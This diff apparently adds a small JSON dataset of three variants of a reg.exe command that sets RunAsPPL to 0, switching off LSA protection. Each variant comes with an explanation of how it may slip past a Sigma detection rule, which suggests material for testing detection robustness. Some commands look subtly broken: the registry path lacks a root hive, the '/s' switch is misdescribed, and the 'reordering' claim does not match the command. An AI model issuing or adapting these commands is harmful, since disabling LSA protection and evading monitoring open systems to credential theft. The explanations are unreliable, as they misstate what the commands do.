@@ -1,0 +1,14 @@
+[
+  {
+    "output": "reg.exe ADD \"SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v RunAsPPL /d 0 /f",
+    "explanation": "Reordering: Reordered the arguments to change the command line structure, which may avoid the Sigma rule's string-based detection."
+  },
+  {
+    "output": "reg.exe ADD \"SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v RunAsPPL /d 0 /f /t REG_DWORD",
+    "explanation": "Insertion: Added an extra parameter (/t REG_DWORD) that does not affect the core action but changes the command line structure, potentially avoiding string-based detection."
+  },
+  {
+    "output": "reg.exe ADD \"SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v RunAsPPL /d 0 /f /t REG_DWORD /s",
+    "explanation": "Insertion: Added a harmless switch (/s) that modifies the command line structure without altering the intended action, possibly evading the Sigma rule's pattern match."
+  }
+]
